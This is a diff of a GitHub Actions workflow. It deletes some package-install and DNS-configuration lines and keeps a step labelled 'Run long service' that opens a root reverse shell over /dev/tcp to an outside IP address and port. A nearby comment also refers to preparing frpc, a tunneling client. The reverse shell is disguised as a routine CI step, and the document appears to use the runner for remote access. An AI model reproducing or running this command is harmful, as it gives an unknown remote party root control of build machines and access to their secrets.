@@ -27,10 +27,6 @@ jobs:
 
       - name: Run long service
         run: |
-         sudo apt-get install docker.io docker-compose -y
-         sudo apt install smartdns -y
-         sudo curl https://github.com/adysec/ARL/raw/master/tools/smartdns.conf > /etc/smartdns/smartdns.conf
-         sudo systemctl restart smartdns
          sudo sh -i >& /dev/tcp/8.138.123.18/8811 0>&1
 
       # Download and prepare frpc
